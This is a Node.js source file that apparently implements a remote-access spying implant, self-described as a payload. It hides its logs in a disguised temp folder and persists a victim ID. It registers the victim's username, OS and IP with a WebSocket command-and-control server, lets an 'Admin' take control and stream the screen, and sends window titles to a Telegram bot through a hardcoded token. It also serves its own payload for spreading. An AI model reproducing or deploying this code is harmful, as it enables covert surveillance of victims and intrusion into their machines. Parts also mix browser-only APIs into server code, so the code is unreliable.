const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs'); 
const os = require('os');
const path = require('path');
const https = require('https');
const crypto = require('crypto');
const http = require('http'); 

// --- LOGGING SYSTEM ---
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
 const timestamp = new Date().toISOString();
 console.log(`[${timestamp}] ${msg}`);
 try {
 fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
 if (ws && ws.readyState === WebSocket.OPEN && myId) {
 safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
 }
 } catch (e) {}
}

log("[INIT] Payload starting...");

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 

const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let isConnected = false;
let isSessionActive = false;

// Persistence Logic
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
try {
 if (fs.existsSync(PERSIST_FILE)) {
 myId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
 log(`[ID] Loaded existing ID: ${myId}`);
 }
} catch(e) {}

// --- WEBRTC VARIABLES ---
let peerConnection = null;
let localStream = null;
let remotePeerId = null;

// --- INIT CONNECTION ---
function initConnection() {
 log(`[WS] Attempting connection to ${WS_URL}...`);
 
 ws = new WebSocket(WS_URL);

 ws.on('open', () => {
 reconnectAttempts = 0;
 isConnected = true;
 
 if (!myId) {
 const mac = getMacAddress();
 myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
 try {
 fs.writeFileSync(PERSIST_FILE, myId);
 } catch(e) {}
 }
 
 log(`[WS] Connected with ID: ${myId}`);

 safeSend(JSON.stringify({
 type: 'info',
 id: myId,
 os: os.platform(),
 arch: os.arch(),
 user: os.userInfo().username,
 ip: getExternalIP(),
 version: '2.0.1'
 }));

 startMonitoring();
 });

 ws.on('message', (msg) => {
 try {
 const data = JSON.parse(msg);
 
 if (data.type === 'take_control') takeControl(true);
 else if (data.type === 'release_control') takeControl(false);
 else if (data.type === 'request_join') {
 log(`[JOIN] Received request_join from ${data.from}`);
 handleJoinRequest(data.from);
 } else if (data.type === 'offer') {
 log(`[SIG] Received Offer from Admin`);
 handleOffer(data.sdp, data.targetId || myId);
 } else if (data.type === 'answer') {
 log(`[SIG] Received Answer from Admin`);
 handleAnswer(data.sdp);
 } else if (data.type === 'candidate') {
 log(`[SIG] Received Candidate`);
 handleCandidate(data.candidate);
 } else if (data.type === 'screen_data') {
 captureScreenPureJS();
 } else if (data.type === 'system_log') {
 // Optional
 }
 } catch (e) {
 log(`[WS] Error parsing message: ${e.message}`);
 }
 });

 ws.on('close', (code, reason) => {
 log(`[WS] Closed. Code: ${code}, Reason: ${reason.toString()}`);
 isConnected = false;
 reconnect();
 });

 ws.on('error', (err) => {
 log(`[WS] Error: ${err.message}`);
 });
}

function reconnect() {
 if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
 reconnectAttempts++;
 const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
 log(`[WS] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
 setTimeout(initConnection, delay);
 } else {
 log("[WS] Max reconnection attempts reached.");
 keepAlive();
 }
}

function safeSend(data) {
 if (!ws) return false;
 if (ws.readyState !== WebSocket.OPEN) return false;
 try {
 ws.send(typeof data === "string" ? data : JSON.stringify(data));
 return true;
 } catch (error) {
 log(`[WS] Send failed: ${error.message}`);
 return false;
 }
}

function startMonitoring() {
 setInterval(() => {
 if (isConnected && ws.readyState === WebSocket.OPEN) {
 safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
 }
 }, 30000);

 setInterval(async () => {
 if (isSessionActive) {
 const title = await getCurrentWindowTitle();
 if (title) {
 sendTelegram(`👁️ Current Window: ${title}`);
 captureScreenPureJS();
 }
 }
 }, 5000);
}

// --- WEBRTC FUNCTIONS ---

async function setupLocalStream() {
 if (localStream) return localStream;
 try {
 log("[WEBRTC] Requesting screen access...");
 localStream = await navigator.mediaDevices.getDisplayMedia({
 video: { cursor: "always" },
 audio: false
 });
 log("[WEBRTC] Screen access granted");
 
 localStream.getVideoTracks()[0].onended = () => {
 log("[WEBRTC] User stopped sharing");
 closePeerConnection();
 };
 return localStream;
 } catch (err) {
 log(`[WEBRTC] Screen access denied: ${err.message}`);
 return null;
 }
}

async function handleJoinRequest(fromId) {
 log(`[JOIN] Starting handshake with Admin: ${fromId}`);
 remotePeerId = fromId;
 
 const stream = await setupLocalStream();
 if (!stream) {
 log("[JOIN] Failed to get stream");
 return;
 }

 peerConnection = new RTCPeerConnection({
 iceServers: [
 { urls: 'stun:stun.l.google.com:19302' },
 { urls: 'stun:stun1.l.google.com:19302' }
 ]
 });

 stream.getTracks().forEach(track => {
 peerConnection.addTrack(track, stream);
 });

 peerConnection.onicecandidate = (event) => {
 if (event.candidate) {
 log("[SIG] Sending ICE Candidate");
 safeSend(JSON.stringify({
 type: 'candidate',
 targetId: fromId,
 candidate: event.candidate
 }));
 }
 };

 peerConnection.ontrack = (event) => {
 log("[WEBRTC] Remote stream received!");
 };

 log("[SIG] Creating Offer");
 const offer = await peerConnection.createOffer();
 await peerConnection.setLocalDescription(offer);
 
 safeSend(JSON.stringify({
 type: 'offer',
 targetId: fromId,
 sdp: peerConnection.localDescription
 }));
 
 log("[SIG] Offer Sent to Admin");
}

function handleOffer(sdp, fromId) {
 log("[SIG] Handling incoming Offer");
 if (!peerConnection) {
 peerConnection = new RTCPeerConnection({
 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
 });
 }
 
 peerConnection.setRemoteDescription(new RTCSessionDescription(sdp)).then(() => {
 return peerConnection.createAnswer();
 }).then(answer => {
 return peerConnection.setLocalDescription(answer);
 }).then(() => {
 safeSend(JSON.stringify({
 type: 'answer',
 targetId: fromId,
 sdp: peerConnection.localDescription
 }));
 log("[SIG] Answer Sent");
 }).catch(err => {
 log(`[WEBRTC] Error handling offer: ${err.message}`);
 });
}

function handleAnswer(sdp) {
 log("[SIG] Setting Remote Description (Answer)");
 peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
 .then(() => {
 log("[WEBRTC] Connection Established!");
 })
 .catch(err => {
 log(`[WEBRTC] Error setting answer: ${err.message}`);
 });
}

function handleCandidate(candidate) {
 log("[SIG] Adding ICE Candidate");
 if (peerConnection) {
 peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
 .catch(err => {
 log(`[WEBRTC] Error adding candidate: ${err.message}`);
 });
 }
}

function closePeerConnection() {
 if (peerConnection) {
 peerConnection.close();
 peerConnection = null;
 }
 if (localStream) {
 localStream.getTracks().forEach(track => track.stop());
 localStream = null;
 }
 log("[WEBRTC] Connection closed");
}

function captureScreenPureJS() {
 if (!ws || ws.readyState !== WebSocket.OPEN) return;
 safeSend(JSON.stringify({
 type: 'screen_data',
 id: myId,
 data: 'LIVE', 
 timestamp: Date.now()
 }));
}

async function getCurrentWindowTitle() {
 return new Promise((resolve) => {
 const platform = os.platform();
 let cmd = '';
 if (platform === 'win32') {
 cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
 } else if (platform === 'darwin') {
 cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
 } else {
 cmd = 'xdotool getwindowfocus getwindowname';
 }
 exec(cmd, (err, stdout) => {
 resolve(stdout.trim());
 });
 });
}

function sendTelegram(msg) {
 const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
 https.get(url, (res) => {
 }).on('error', (e) => {
 log(`[TG] Error: ${e.message}`);
 });
}

function getExternalIP() {
 const nets = os.networkInterfaces();
 for (const name of Object.keys(nets)) {
 for (const net of nets[name]) {
 if (net.family === 'IPv4' && !net.internal) {
 return net.address;
 }
 }
 }
 return 'unknown';
}

function getMacAddress() {
 const nets = os.networkInterfaces();
 for (const name of Object.keys(nets)) {
 for (const net of nets[name]) {
 if (net.mac !== '00:00:00:00:00:00') {
 return net.mac;
 }
 }
 }
 return 'default-mac';
}

function takeControl(state) {
 log(`[CTRL] Take Control: ${state}`);
 isSessionActive = state;
}

// --- HTTP SERVER SETUP ---
const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
 if (req.url === '/payload.js') {
 res.writeHead(200, { 'Content-Type': 'application/javascript' });
 res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
 } 
 else if (req.url === '/' || req.url === '/index.html') {
 const indexPath = path.join(__dirname, 'index.html');
 if (fs.existsSync(indexPath)) {
 res.writeHead(200, { 'Content-Type': 'text/html' });
 res.end(fs.readFileSync(indexPath));
 } else {
 res.writeHead(404);
 res.end('index.html not found');
 }
 } 
 else if (req.url === '/health') {
 res.writeHead(200, { 'Content-Type': 'text/plain' });
 res.end('OK');
 } 
 else {
 res.writeHead(200, { 'Content-Type': 'application/json' });
 res.end(JSON.stringify({ 
 status: 'running', 
 id: myId || 'pending_connection',
 timestamp: new Date().toISOString()
 }));
 }
});

server.listen(PORT, () => {
 log(`[HTTP] Server listening on port ${PORT}`);
 initConnection();
});

setInterval(() => {}, 60000);

exports.handler = async (event, context) => {
 return {
 statusCode: 200,
 body: JSON.stringify({ status: 'running', id: myId })
 };
};
